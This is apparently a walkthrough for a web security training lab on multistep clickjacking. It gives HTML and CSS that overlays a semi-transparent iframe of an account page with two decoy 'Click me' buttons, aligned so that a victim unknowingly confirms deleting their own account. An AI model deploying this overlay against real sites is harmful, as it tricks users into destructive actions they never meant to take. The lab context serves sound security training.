This lab is same as the `Basic clickjacking with CSRF token protection`, except there is an extra confirmation dialog on clicking the "delete account" button. We've to take into account two clicks and align them to suit our exploit code.

Go to exploit server and paste the following code into the body.   

```
<br>
<style>
   #iframeBlock {
       position:relative;
       width:700;
       height:555;
       opacity: 0.500;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:510;
       left:50;
       z-index: 1;
   }
   .secondClick {
       top:310;
       left:200;
   }
</style>
<div class="firstClick">Click me first!</div>
<div class="secondClick">Click me next!</div>
<iframe id="iframeBlock" src="https://ac911f761ec53b4b806b1ae4000100ec.web-security-academy.net/my-account"></iframe>
```


Edit the url and then click on `View exploit` and check whether everything is aligned properly, If everything is okay, then click on `Click me first!` button. Next, check whether our second button is aligned properly or not. Don't click on the second button, as clicking it'll delete the current user account. If everything is aligned properly, go back to exploit server and click on `Deliver exploit to victim` and the lab will be solved!

